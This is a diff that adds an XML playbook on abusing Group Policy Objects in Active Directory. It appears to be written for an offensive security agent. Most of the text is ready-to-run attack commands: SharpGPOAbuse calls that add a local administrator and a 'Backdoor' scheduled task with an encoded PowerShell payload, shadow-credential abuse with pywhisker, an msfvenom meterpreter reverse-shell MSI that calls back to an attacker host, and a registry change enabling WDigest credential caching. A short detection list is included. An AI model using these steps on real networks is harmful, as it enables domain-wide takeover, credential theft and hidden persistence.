@@ -1,0 +1,144 @@
+<vulnerability_guide>
+  <title>GROUP POLICY OBJECT (GPO) ABUSE</title>
+
+  <critical>GPO abuse allows attackers to leverage misconfigured Group Policy permissions for privilege escalation, lateral movement, and persistence across domain-joined systems. A single GPO misconfiguration can compromise hundreds of machines simultaneously.</critical>
+
+  <scope>
+    - GPO permission enumeration
+    - GPO modification attacks
+    - Scheduled task deployment via GPO
+    - Software installation abuse
+    - Startup script attacks
+    - Restricted groups manipulation
+  </scope>
+
+  <methodology>
+    1. GPO ENUMERATION
+       {% raw %}
+       # List all GPOs
+       Get-DomainGPO | select displayname,gpcfilesyspath
+
+       # Find GPOs applied to specific OU
+       Get-DomainOU -Identity "OU=Servers,DC=domain,DC=local" | select gplink
+
+       # Check GPO permissions
+       Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite"}
+
+       # Find GPOs you can modify
+       Get-DomainGPO | % {
+         $gpo = $_
+         Get-ObjectAcl -Name $_.Name -ResolveGUIDs | ? {
+           $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" -and
+           $_.SecurityIdentifier -eq (Get-DomainUser currentuser).objectsid
+         } | select @{N='GPO';E={$gpo.displayname}}, ActiveDirectoryRights
+       }
+       {% endraw %}
+
+    2. GPO MODIFICATION ATTACKS
+       {% raw %}
+       # Using SharpGPOAbuse
+       SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "VulnerableGPO"
+
+       # Add immediate scheduled task
+       SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author NT AUTHORITY\SYSTEM --Command "powershell.exe" --Arguments "-enc BASE64PAYLOAD" --GPOName "VulnerableGPO" --Force
+
+       # Add startup script
+       SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" --ScriptContents "net localgroup administrators attacker /add" --GPOName "VulnerableGPO"
+       {% endraw %}
+
+    3. MANUAL GPO EXPLOITATION
+       {% raw %}
+       # GPO file location
+       \\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\
+
+       # Add scheduled task XML
+       # Location: Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+
+       # Add startup script
+       # Location: Machine\Scripts\Startup\malicious.bat
+       # Update: Machine\Scripts\scripts.ini
+       {% endraw %}
+
+    4. PYWHISKER FOR SHADOW CREDENTIALS
+       {% raw %}
+       # If you can write to msDS-KeyCredentialLink
+       pywhisker.py -d domain.local -u user -p pass --target victim$ --action add
+
+       # Then authenticate with the certificate
+       gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass pass domain.local/victim$ victim.ccache
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <restricted_groups>
+      Manipulate local group membership across all GPO-affected computers
+      {% raw %}
+      # Add user to local admins via Restricted Groups
+      # Machine\Preferences\Groups\Groups.xml
+
+      # Or via Security Settings
+      # Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+      [Group Membership]
+      *S-1-5-32-544__Members = *S-1-5-21-...-1234
+      {% endraw %}
+    </restricted_groups>
+
+    <software_installation>
+      Deploy malicious MSI packages to target computers
+      {% raw %}
+      # Create MSI payload
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi > evil.msi
+
+      # Configure software installation GPO
+      # User/Computer Configuration > Software Settings > Software Installation
+      {% endraw %}
+    </software_installation>
+
+    <registry_modifications>
+      {% raw %}
+      # Add registry keys via GPO
+      # Machine\Preferences\Registry\Registry.xml
+
+      # Example: Enable WDigest for credential caching
+      <Registry>
+        <Properties action="U" hive="HKEY_LOCAL_MACHINE"
+          key="SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+          name="UseLogonCredential" type="REG_DWORD" value="1"/>
+      </Registry>
+      {% endraw %}
+    </registry_modifications>
+
+    <persistence>
+      - GPO changes replicate across domain controllers
+      - Survive system rebuilds if machine rejoins domain
+      - Difficult to detect without GPO auditing
+      - Can target specific OUs for stealth
+    </persistence>
+  </advanced_techniques>
+
+  <detection>
+    - Event ID 5136: Directory service object modified
+    - Monitor SYSVOL for unauthorized changes
+    - Track GPO version changes
+    - Alert on new scheduled tasks via GPO
+    - Monitor for unusual software installations
+  </detection>
+
+  <validation>
+    - Confirm GPO modification permissions
+    - Verify payload execution on target systems
+    - Test persistence across gpupdate cycles
+    - Ensure changes replicate to all DCs
+  </validation>
+
+  <pro_tips>
+    - Target GPOs applied to high-value OUs (Domain Controllers, Servers)
+    - Immediate scheduled tasks execute within 10 minutes
+    - Computer startup scripts run as SYSTEM
+    - User logon scripts run as the user
+    - Check both Computer and User configuration sections
+    - GPO changes require gpupdate or reboot to apply
+  </pro_tips>
+
+  <remember>GPO abuse is powerful because it affects all computers/users where the GPO is linked. A single misconfigured GPO permission can lead to domain-wide compromise. Always check for write permissions on GPOs linked to privileged OUs.</remember>
+</vulnerability_guide>
